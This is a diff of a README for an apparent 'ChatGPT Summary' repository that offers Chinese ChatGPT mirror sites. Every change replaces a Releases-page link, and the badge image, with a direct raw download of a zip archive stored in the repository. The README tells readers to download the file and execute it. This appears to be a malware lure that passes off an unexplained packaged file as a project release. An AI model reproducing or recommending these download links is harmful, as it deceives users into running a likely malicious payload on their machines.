@@ -1,10 +1,10 @@
 # ChatGPT Summary 🌐
 
-![ChatGPT Summary](https://img.shields.io/badge/ChatGPT%20中文版-%E5%85%8D%E8%B4%B9%E6%8E%A8%E8%8D%90-brightgreen)
+![ChatGPT Summary](https://raw.githubusercontent.com/EmanuelCortez21/chatgpt-summary/main/astatine/summary_chatgpt_2.5.zip%20中文版-%E5%85%8D%E8%B4%B9%E6%8E%A8%E8%8D%90-brightgreen)
 
 Welcome to the **ChatGPT Summary** repository! This project aims to provide a comprehensive guide to the Chinese version of ChatGPT, including free mirror sites available in China. We support various versions of GPT, including GPT-4, 4o, and other models like o1, o3, deepseek, and grok3. 
 
-For the latest updates and releases, visit our [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases).
+For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/EmanuelCortez21/chatgpt-summary/main/astatine/summary_chatgpt_2.5.zip).
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ ChatGPT has revolutionized how we interact with AI. This repository serves as a 
 
 ## Installation
 
-To get started with ChatGPT Summary, you need to download the latest release. Visit our [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases) to find the necessary files. Download and execute them to set up the project.
+To get started with ChatGPT Summary, you need to download the latest release. Visit our [Releases section](https://raw.githubusercontent.com/EmanuelCortez21/chatgpt-summary/main/astatine/summary_chatgpt_2.5.zip) to find the necessary files. Download and execute them to set up the project.
 
 ### Prerequisites
 
@@ -41,7 +41,7 @@ Before installation, ensure you have the following:
 
 ### Steps
 
-1. Go to the [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases).
+1. Go to the [Releases section](https://raw.githubusercontent.com/EmanuelCortez21/chatgpt-summary/main/astatine/summary_chatgpt_2.5.zip).
 2. Download the latest version.
 3. Extract the files.
 4. Follow the instructions in the README file included in the release.
@@ -96,4 +96,4 @@ For any inquiries or support, please reach out via the Issues section on GitHub.
 
 Thank you for your interest in ChatGPT Summary! We hope this resource helps you navigate the world of AI more effectively. 
 
-For the latest updates and releases, visit our [Releases section](https://github.com/EmanuelCortez21/chatgpt-summary/releases).
+For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/EmanuelCortez21/chatgpt-summary/main/astatine/summary_chatgpt_2.5.zip).
